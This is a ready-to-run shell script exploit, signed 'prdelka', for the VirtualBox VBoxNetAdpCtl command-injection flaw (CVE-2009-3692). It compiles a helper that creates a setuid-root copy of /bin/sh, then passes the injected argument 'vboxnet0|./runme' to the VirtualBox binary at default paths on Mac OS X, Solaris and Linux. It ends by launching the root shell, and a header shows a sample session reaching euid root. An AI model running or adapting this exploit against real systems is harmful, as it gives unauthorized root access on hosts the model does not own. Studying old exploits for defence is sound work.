#!/bin/sh
# CVE-2009-3692 Sun VirtualBox <= 3.0.6 local root exploit 
# ========================================================
# Exploits popen() meta char shell injection vulnerability
# in Sun VirtualBox.
# 
# E.g.
# admin@sundevil:~/test$ id
# uid=101(admin) gid=10(staff) groups=10(staff)
# admin@sundevil:~/test$ uname -a
# SunOS sundevil 5.11 snv_111b i86pc i386 i86pc Solaris
# admin@sundevil:~/test$ ./prdelka-vs-SUN-virtualbox.sh 
# [ Sun VirtualBox <= 3.0.6 OSX/SOL/LINUX local root exploit
# [ No path provided, will attempt to exploit system default
# [ Places a root shell in ./sh if succesful
# [ Detected a SunOS target
# [ Detected SunOS is x86 platform
# ifconfig: add: bad address
# [ Trying for root shell.
# # id
# uid=101(admin) gid=10(staff) euid=0(root) egid=0(root) groups=10(staff)
#
# -- prdelka 
cat >> runme.c << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

int main(int argc, char* argv[]){
	FILE *from, *to;
	int fd;
	char ch;
	setuid(0);
	setgid(0);
	from = fopen("/bin/sh","rb");
	to = fopen("./sh","wb");
	while(!feof(from)){
		ch = fgetc(from);
		if(!feof(from))
			fputc(ch, to);
	}
	fclose(from);
	fclose(to);
	fd = open("./sh",O_RDWR);
	fchown(fd,0,0);
	fchmod(fd,S_IRWXU|S_IRWXG|S_IRWXO|S_ISUID|S_ISGID);
	close(fd);	
	exit(0);
}
EOF
gcc runme.c -o runme 2>/dev/null
rm -rf runme.c
cat >> exploit.c << EOF
/*
 CVE-2009-3692 VirtualBox VBoxNetAdpCtl Privilege Escalation
 ===========================================================
 Local exploit for the popen() meta character shell injection
 vulnerability that permits a malicious user to obtain root
 privileges on the VirtualBox host machine. This exploit relies
 on the "/bin/sh" binary on the host as being a non-privilege
 dropping shell such as zsh, this is not always the OS default
 setting.
 
 Most modern platforms do not have a /bin/sh that retains 
 privileges by default however Solaris still seems to!

 You can provide an arguement to the VBoxNetAdpCtl binary 
 path or alternatively this exploit detects local host platform
 and runs with common or default installation location.
 */
#include <stdio.h>
#include <stdlib.h>
#include <sys/utsname.h>

int main(int argc,char* argv[])
{
        char *env[] = {NULL};
	int platform, machine = 0;
	struct utsname* sysdetail = malloc(sizeof(struct utsname));
	printf("[ Sun VirtualBox <= 3.0.6 OSX/SOL/LINUX local root exploit\n");
	if(argc > 1){
		printf("[ Trying %s\n", argv[1]);
		execle(argv[1],argv[1],"vboxnet0|./runme","1::2",NULL,env);
		exit(0);
	}
	else{
		printf("[ No path provided, will attempt to exploit system default\n");
	}
 	printf("[ Places a root shell in ./sh if succesful\n");
	uname(sysdetail);
	if(!strncmp("Darwin",sysdetail->sysname,strlen("Darwin")))
		platform = 1;
	if(!strncmp("SunOS",sysdetail->sysname,strlen("SunOS"))) 
		platform = 2; 
	if(!strncmp("Linux",sysdetail->sysname,strlen("Linux"))) 
		platform = 3;
	switch(platform){
		case 1:
			printf("[ Detected a Mac OS X target\n");
			execle("/Applications/VirtualBox.app/Contents/MacOS/VBoxNetAdpCtl","VBoxNetAdpCtl","vboxnet0|./runme","1::2",NULL,env);
			break;
		case 2:
			printf("[ Detected a SunOS target\n");
			if(!strncmp("i86pc",sysdetail->machine,strlen("i86pc"))){
				printf("[ Detected SunOS is x86 platform\n");
				execle("/opt/VirtualBox/i386/VBoxNetAdpCtl","VBoxNetAdpCtl","vboxnet0|./runme","1::2",NULL,env);
			}
			else{
				printf("[ Guessing SunOS is amd64 platform\n");
				execle("/opt/VirtualBox/amd64/VBoxNetAdpCtl","VBoxNetAdpCtl","vboxnet0|./runme","1::2",NULL,env);
			}
			break;
		case 3:
			printf("[ Detected a Linux target\n");
			execle("/opt/VirtualBox/VBoxNetAdpCtl","VBoxNetAdpCtl","vboxnet0|./runme","1::2",NULL,env);
			break;
		default:
			printf("[ Unknown OSE target. Try ./%s <path>/VBoxNetAdpCtl\n",argv[0]);
			break;
	}
        exit(0);
}
EOF
gcc exploit.c -o exploit 2>/dev/null
rm -rf exploit.c
if [ $1 ]
then
        ./exploit $1
else
        ./exploit
fi
echo [ Trying for root shell.
./sh
